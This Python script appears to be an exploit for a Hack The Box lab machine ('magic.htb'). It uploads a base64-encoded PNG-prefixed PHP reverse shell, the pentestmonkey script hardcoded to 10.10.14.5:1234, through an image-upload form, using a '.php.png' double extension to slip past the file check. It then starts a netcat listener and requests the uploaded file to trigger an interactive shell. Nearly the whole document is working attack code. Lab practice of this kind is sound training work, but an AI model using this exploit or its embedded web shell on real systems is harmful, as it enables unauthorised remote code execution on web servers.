import urllib3
import sys
import requests
import base64
import time
import subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

session = requests.Session()

URL = 'http://magic.htb/upload.php'

fileBase64 = "iVBORw0KGgo8P3BocAovLyBwaHAtcmV2ZXJzZS1zaGVsbCAtIEEgUmV2ZXJzZSBTaGVsbCBpbXBsZW1lbnRhdGlvbiBpbiBQSFAKLy8gQ29weXJpZ2h0IChDKSAyMDA3IHBlbnRlc3Rtb25rZXlAcGVudGVzdG1vbmtleS5uZXQKLy8KLy8gVGhpcyB0b29sIG1heSBiZSB1c2VkIGZvciBsZWdhbCBwdXJwb3NlcyBvbmx5LiAgVXNlcnMgdGFrZSBmdWxsIHJlc3BvbnNpYmlsaXR5Ci8vIGZvciBhbnkgYWN0aW9ucyBwZXJmb3JtZWQgdXNpbmcgdGhpcyB0b29sLiAgVGhlIGF1dGhvciBhY2NlcHRzIG5vIGxpYWJpbGl0eQovLyBmb3IgZGFtYWdlIGNhdXNlZCBieSB0aGlzIHRvb2wuICBJZiB0aGVzZSB0ZXJtcyBhcmUgbm90IGFjY2VwdGFibGUgdG8geW91LCB0aGVuCi8vIGRvIG5vdCB1c2UgdGhpcyB0b29sLgovLwovLyBJbiBhbGwgb3RoZXIgcmVzcGVjdHMgdGhlIEdQTCB2ZXJzaW9uIDIgYXBwbGllczoKLy8KLy8gVGhpcyBwcm9ncmFtIGlzIGZyZWUgc29mdHdhcmU7IHlvdSBjYW4gcmVkaXN0cmlidXRlIGl0IGFuZC9vciBtb2RpZnkKLy8gaXQgdW5kZXIgdGhlIHRlcm1zIG9mIHRoZSBHTlUgR2VuZXJhbCBQdWJsaWMgTGljZW5zZSB2ZXJzaW9uIDIgYXMKLy8gcHVibGlzaGVkIGJ5IHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24uCi8vCi8vIFRoaXMgcHJvZ3JhbSBpcyBkaXN0cmlidXRlZCBpbiB0aGUgaG9wZSB0aGF0IGl0IHdpbGwgYmUgdXNlZnVsLAovLyBidXQgV0lUSE9VVCBBTlkgV0FSUkFOVFk7IHdpdGhvdXQgZXZlbiB0aGUgaW1wbGllZCB3YXJyYW50eSBvZgovLyBNRVJDSEFOVEFCSUxJVFkgb3IgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UuICBTZWUgdGhlCi8vIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGZvciBtb3JlIGRldGFpbHMuCi8vCi8vIFlvdSBzaG91bGQgaGF2ZSByZWNlaXZlZCBhIGNvcHkgb2YgdGhlIEdOVSBHZW5lcmFsIFB1YmxpYyBMaWNlbnNlIGFsb25nCi8vIHdpdGggdGhpcyBwcm9ncmFtOyBpZiBub3QsIHdyaXRlIHRvIHRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIEluYy4sCi8vIDUxIEZyYW5rbGluIFN0cmVldCwgRmlmdGggRmxvb3IsIEJvc3RvbiwgTUEgMDIxMTAtMTMwMSBVU0EuCi8vCi8vIFRoaXMgdG9vbCBtYXkgYmUgdXNlZCBmb3IgbGVnYWwgcHVycG9zZXMgb25seS4gIFVzZXJzIHRha2UgZnVsbCByZXNwb25zaWJpbGl0eQovLyBmb3IgYW55IGFjdGlvbnMgcGVyZm9ybWVkIHVzaW5nIHRoaXMgdG9vbC4gIElmIHRoZXNlIHRlcm1zIGFyZSBub3QgYWNjZXB0YWJsZSB0bwovLyB5b3UsIHRoZW4gZG8gbm90IHVzZSB0aGlzIHRvb2wuCi8vCi8vIFlvdSBhcmUgZW5jb3VyYWdlZCB0byBzZW5kIGNvbW1lbnRzLCBpbXByb3ZlbWVudHMgb3Igc3VnZ2VzdGlvbnMgdG8KLy8gbWUgYXQgcGVudGVzdG1vbmtleUBwZW50ZXN0bW9ua2V5Lm5ldAovLwovLyBEZXNjcmlwdGlvbgovLyAtLS0tLS0tLS0tLQovLyBUaGlzIHNjcmlwdCB3aWxsIG1ha2UgYW4gb3V0Ym91bmQgVENQIGNvbm5lY3Rpb24gdG8gYSBoYXJkY29kZWQgSVAgYW5kIHBvcnQuCi8vIFRoZSByZWNpcGllbnQgd2lsbCBiZSBnaXZlbiBhIHNoZWxsIHJ1bm5pbmcgYXMgdGhlIGN1cnJlbnQgdXNlciAoYXBhY2hlIG5vcm1hbGx5KS4KLy8KLy8gTGltaXRhdGlvbnMKLy8gLS0tLS0tLS0tLS0KLy8gcHJvY19vcGVuIGFuZCBzdHJlYW1fc2V0X2Jsb2NraW5nIHJlcXVpcmUgUEhQIHZlcnNpb24gNC4zKywgb3IgNSsKLy8gVXNlIG9mIHN0cmVhbV9zZWxlY3QoKSBvbiBmaWxlIGRlc2NyaXB0b3JzIHJldHVybmVkIGJ5IHByb2Nfb3BlbigpIHdpbGwgZmFpbCBhbmQgcmV0dXJuIEZBTFNFIHVuZGVyIFdpbmRvd3MuCi8vIFNvbWUgY29tcGlsZS10aW1lIG9wdGlvbnMgYXJlIG5lZWRlZCBmb3IgZGFlbW9uaXNhdGlvbiAobGlrZSBwY250bCwgcG9zaXgpLiAgVGhlc2UgYXJlIHJhcmVseSBhdmFpbGFibGUuCi8vCi8vIFVzYWdlCi8vIC0tLS0tCi8vIFNlZSBodHRwOi8vcGVudGVzdG1vbmtleS5uZXQvdG9vbHMvcGhwLXJldmVyc2Utc2hlbGwgaWYgeW91IGdldCBzdHVjay4KCnNldF90aW1lX2xpbWl0ICgwKTsKJFZFUlNJT04gPSAiMS4wIjsKJGlwID0gJzEwLjEwLjE0LjUnOyAgLy8gQ0hBTkdFIFRISVMKJHBvcnQgPSAxMjM0OyAgICAgICAvLyBDSEFOR0UgVEhJUwokY2h1bmtfc2l6ZSA9IDE0MDA7CiR3cml0ZV9hID0gbnVsbDsKJGVycm9yX2EgPSBudWxsOwokc2hlbGwgPSAndW5hbWUgLWE7IHc7IGlkOyAvYmluL3NoIC1pJzsKJGRhZW1vbiA9IDA7CiRkZWJ1ZyA9IDA7CgovLwovLyBEYWVtb25pc2Ugb3Vyc2VsZiBpZiBwb3NzaWJsZSB0byBhdm9pZCB6b21iaWVzIGxhdGVyCi8vCgovLyBwY250bF9mb3JrIGlzIGhhcmRseSBldmVyIGF2YWlsYWJsZSwgYnV0IHdpbGwgYWxsb3cgdXMgdG8gZGFlbW9uaXNlCi8vIG91ciBwaHAgcHJvY2VzcyBhbmQgYXZvaWQgem9tYmllcy4gIFdvcnRoIGEgdHJ5Li4uCmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewoJLy8gRm9yayBhbmQgaGF2ZSB0aGUgcGFyZW50IHByb2Nlc3MgZXhpdAoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsKCQoJaWYgKCRwaWQgPT0gLTEpIHsKCQlwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOwoJCWV4aXQoMSk7Cgl9CgkKCWlmICgkcGlkKSB7CgkJZXhpdCgwKTsgIC8vIFBhcmVudCBleGl0cwoJfQoKCS8vIE1ha2UgdGhlIGN1cnJlbnQgcHJvY2VzcyBhIHNlc3Npb24gbGVhZGVyCgkvLyBXaWxsIG9ubHkgc3VjY2VlZCBpZiB3ZSBmb3JrZWQKCWlmIChwb3NpeF9zZXRzaWQoKSA9PSAtMSkgewoJCXByaW50aXQoIkVycm9yOiBDYW4ndCBzZXRzaWQoKSIpOwoJCWV4aXQoMSk7Cgl9CgoJJGRhZW1vbiA9IDE7Cn0gZWxzZSB7CglwcmludGl0KCJXQVJOSU5HOiBGYWlsZWQgdG8gZGFlbW9uaXNlLiAgVGhpcyBpcyBxdWl0ZSBjb21tb24gYW5kIG5vdCBmYXRhbC4iKTsKfQoKLy8gQ2hhbmdlIHRvIGEgc2FmZSBkaXJlY3RvcnkKY2hkaXIoIi8iKTsKCi8vIFJlbW92ZSBhbnkgdW1hc2sgd2UgaW5oZXJpdGVkCnVtYXNrKDApOwoKLy8KLy8gRG8gdGhlIHJldmVyc2Ugc2hlbGwuLi4KLy8KCi8vIE9wZW4gcmV2ZXJzZSBjb25uZWN0aW9uCiRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMzApOwppZiAoISRzb2NrKSB7CglwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7CglleGl0KDEpOwp9CgovLyBTcGF3biBzaGVsbCBwcm9jZXNzCiRkZXNjcmlwdG9yc3BlYyA9IGFycmF5KAogICAwID0+IGFycmF5KCJwaXBlIiwgInIiKSwgIC8vIHN0ZGluIGlzIGEgcGlwZSB0aGF0IHRoZSBjaGlsZCB3aWxsIHJlYWQgZnJvbQogICAxID0+IGFycmF5KCJwaXBlIiwgInciKSwgIC8vIHN0ZG91dCBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwogICAyID0+IGFycmF5KCJwaXBlIiwgInciKSAgIC8vIHN0ZGVyciBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCB3cml0ZSB0bwopOwoKJHByb2Nlc3MgPSBwcm9jX29wZW4oJHNoZWxsLCAkZGVzY3JpcHRvcnNwZWMsICRwaXBlcyk7CgppZiAoIWlzX3Jlc291cmNlKCRwcm9jZXNzKSkgewoJcHJpbnRpdCgiRVJST1I6IENhbid0IHNwYXduIHNoZWxsIik7CglleGl0KDEpOwp9CgovLyBTZXQgZXZlcnl0aGluZyB0byBub24tYmxvY2tpbmcKLy8gUmVhc29uOiBPY2NzaW9uYWxseSByZWFkcyB3aWxsIGJsb2NrLCBldmVuIHRob3VnaCBzdHJlYW1fc2VsZWN0IHRlbGxzIHVzIHRoZXkgd29uJ3QKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7CgpwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7Cgp3aGlsZSAoMSkgewoJLy8gQ2hlY2sgZm9yIGVuZCBvZiBUQ1AgY29ubmVjdGlvbgoJaWYgKGZlb2YoJHNvY2spKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCS8vIENoZWNrIGZvciBlbmQgb2YgU1RET1VUCglpZiAoZmVvZigkcGlwZXNbMV0pKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIHByb2Nlc3MgdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCS8vIFdhaXQgdW50aWwgYSBjb21tYW5kIGlzIGVuZCBkb3duICRzb2NrLCBvciBzb21lCgkvLyBjb21tYW5kIG91dHB1dCBpcyBhdmFpbGFibGUgb24gU1RET1VUIG9yIFNUREVSUgoJJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkkbnVtX2NoYW5nZWRfc29ja2V0cyA9IHN0cmVhbV9zZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxsKTsKCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBUQ1Agc29ja2V0LCBzZW5kCgkvLyBkYXRhIHRvIHByb2Nlc3MncyBTVERJTgoJaWYgKGluX2FycmF5KCRzb2NrLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNPQ0sgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRzb2NrLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSzogJGlucHV0Iik7CgkJZndyaXRlKCRwaXBlc1swXSwgJGlucHV0KTsKCX0KCgkvLyBJZiB3ZSBjYW4gcmVhZCBmcm9tIHRoZSBwcm9jZXNzJ3MgU1RET1VUCgkvLyBzZW5kIGRhdGEgZG93biB0Y3AgY29ubmVjdGlvbgoJaWYgKGluX2FycmF5KCRwaXBlc1sxXSwgJHJlYWRfYSkpIHsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQgUkVBRCIpOwoJCSRpbnB1dCA9IGZyZWFkKCRwaXBlc1sxXSwgJGNodW5rX3NpemUpOwoJCWlmICgkZGVidWcpIHByaW50aXQoIlNURE9VVDogJGlucHV0Iik7CgkJZndyaXRlKCRzb2NrLCAkaW5wdXQpOwoJfQoKCS8vIElmIHdlIGNhbiByZWFkIGZyb20gdGhlIHByb2Nlc3MncyBTVERFUlIKCS8vIHNlbmQgZGF0YSBkb3duIHRjcCBjb25uZWN0aW9uCglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9Cn0KCmZjbG9zZSgkc29jayk7CmZjbG9zZSgkcGlwZXNbMF0pOwpmY2xvc2UoJHBpcGVzWzFdKTsKZmNsb3NlKCRwaXBlc1syXSk7CnByb2NfY2xvc2UoJHByb2Nlc3MpOwoKLy8gTGlrZSBwcmludCwgYnV0IGRvZXMgbm90aGluZyBpZiB3ZSd2ZSBkYWVtb25pc2VkIG91cnNlbGYKLy8gKEkgY2FuJ3QgZmlndXJlIG91dCBob3cgdG8gcmVkaXJlY3QgU1RET1VUIGxpa2UgYSBwcm9wZXIgZGFlbW9uKQpmdW5jdGlvbiBwcmludGl0ICgkc3RyaW5nKSB7CglpZiAoISRkYWVtb24pIHsKCQlwcmludCAiJHN0cmluZ1xuIjsKCX0KfQoKPz4gCgoKCg=="

file = base64.b64decode(fileBase64)

shellFile = {
		'image':('reverseShell.php.png', file,'image/png'),
		'submit':(None,"Upload Image")
	}

print("[+] Uploading reverse shell...")
session.post(URL, verify=False, proxies=proxies, files=shellFile)

time.sleep(1)

fileURL = "http://magic.htb/images/uploads/reverseShell.php.png"

nc_listener = subprocess.Popen(["nc","-nvlp","1234"])
time.sleep(1)

session.get(fileURL, verify=False, proxies=proxies)

nc_listener.wait()
